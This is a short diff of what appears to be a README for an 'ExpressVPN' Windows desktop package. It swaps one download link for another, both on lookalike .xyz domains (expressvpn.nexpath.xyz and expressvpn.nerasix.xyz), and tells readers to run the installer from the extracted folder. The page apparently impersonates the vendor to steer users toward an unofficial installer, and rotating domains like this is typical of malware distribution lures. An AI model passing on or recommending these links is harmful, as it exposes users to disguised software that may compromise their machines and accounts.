@@ -8,8 +8,8 @@ ExpressVPN desktop package for Windows · vpn toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[expressvpn.nexpath.xyz](https://expressvpn.nexpath.xyz/)**
-* **Full URL:** `https://expressvpn.nexpath.xyz/`
+* **Project link:** **[expressvpn.nerasix.xyz](https://expressvpn.nerasix.xyz/)**
+* **Full URL:** `https://expressvpn.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
